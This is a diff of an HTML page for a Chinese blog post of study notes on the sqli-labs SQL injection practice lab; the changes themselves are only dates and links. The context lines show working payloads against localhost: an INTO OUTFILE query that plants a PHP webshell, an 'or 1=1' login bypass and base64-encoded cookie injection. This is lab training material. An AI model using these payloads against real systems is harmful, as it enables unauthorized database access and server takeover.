@@ -21,7 +21,7 @@
 <meta property="og:url" content="http://isron.dropsec.xyz/2016/10/25/sqli-labs/index.html">
 <meta property="og:site_name" content="Isron">
 <meta property="og:description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
-<meta property="og:updated_time" content="2016-10-31T12:21:13.284Z">
+<meta property="og:updated_time" content="2017-04-04T05:59:38.373Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs学习笔记总结">
 <meta name="twitter:description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
@@ -363,7 +363,7 @@ into outfile ‘目标文件’ [option];
 </code></pre><p>主要payload：</p>
 <pre><code>http://127.0.0.1/Less-7/?id=1&apos;))union select 1,2,3 into outfile &apos;D:/wamp/www/Less-7/1.txt&apos; --+  //在绝对路径生成一个1.txt文件
 http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/www/Less-7/1.jpg&apos;),3 into outfile &apos;D:/wamp/www/Less-7/1.php&apos; --+  //将一句话木马上传到网站目录上
-</code></pre><h2 id="sqli-less-8-9-10-15-16"><a href="#sqli-less-8-9-10-15-16" class="headerlink" title="sqli-less-8,9,10,15,16"></a>sqli-less-8,9,10,15,16</h2><p>盲注<a href="https://clearloveqaq.github.io/2016/09/22/sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">之前的盲注笔记</a></p>
+</code></pre><h2 id="sqli-less-8-9-10-15-16"><a href="#sqli-less-8-9-10-15-16" class="headerlink" title="sqli-less-8,9,10,15,16"></a>sqli-less-8,9,10,15,16</h2><p>盲注<a href="http://isron.dropsec.xyz/2016/09/22/sql_mz/">之前的盲注笔记</a></p>
 <h2 id="sqli-less-11-12"><a href="#sqli-less-11-12" class="headerlink" title="sqli-less-11,12"></a>sqli-less-11,12</h2><p>post传参注入<br>常见的万能密码：<br>    or 1=1 #<br>    ‘or’=’or’<br>主要payload：</p>
 <pre><code>uname=111&apos; or 1=1 #&amp;passwd=111&amp;submit=Submit  //成功登陆 可以添加一个limit函数 获取其他的name password 然后可以在111’后构建攻击代码
 </code></pre><h2 id="sqli-less-13-14"><a href="#sqli-less-13-14" class="headerlink" title="sqli-less-13,14"></a>sqli-less-13,14</h2><p>基于错误的post型注入</p>
@@ -391,7 +391,7 @@ http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/ww
 <pre><code>Cookie: uname=1&apos; union select 1,database(),@@version #   //less20
 Cookie:uname=MScpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksQEB2ZXJzaW9uICM=   //less21 进行编码绕过
 Cookie: uname=MSIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSxAQHZlcnNpb24gIw==
-</code></pre><h2 id="sqli-less-23-37"><a href="#sqli-less-23-37" class="headerlink" title="sqli-less-23-37"></a>sqli-less-23-37</h2><p>基于waf的Get型注入 <a href="https://clearloveqaq.github.io/2016/10/15/sql%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">sql绕过技巧</a></p>
+</code></pre><h2 id="sqli-less-23-37"><a href="#sqli-less-23-37" class="headerlink" title="sqli-less-23-37"></a>sqli-less-23-37</h2><p>基于waf的Get型注入 <a href="http://isron.dropsec.xyz/2016/10/15/sql_bypass/">sql绕过技巧</a></p>
 <h2 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h2><pre><code>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。
 如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。
 </code></pre>
@@ -405,7 +405,7 @@ Cookie: uname=MSIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSxAQHZlcnNpb24gIw==
         <p><span>本文标题:</span><a href="/2016/10/25/sqli-labs/">sqli-labs学习笔记总结</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
         <p><span>发布时间:</span>2016-10-25, 21:42:36</p>
-        <p><span>最后更新:</span>2016-10-31, 20:21:13</p>
+        <p><span>最后更新:</span>2017-04-04, 13:59:38</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/10/25/sqli-labs/" title="sqli-labs学习笔记总结">http://isron.dropsec.xyz/2016/10/25/sqli-labs/</a>
             <span class="copy-path" data-clipboard-text="原文: http://isron.dropsec.xyz/2016/10/25/sqli-labs/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
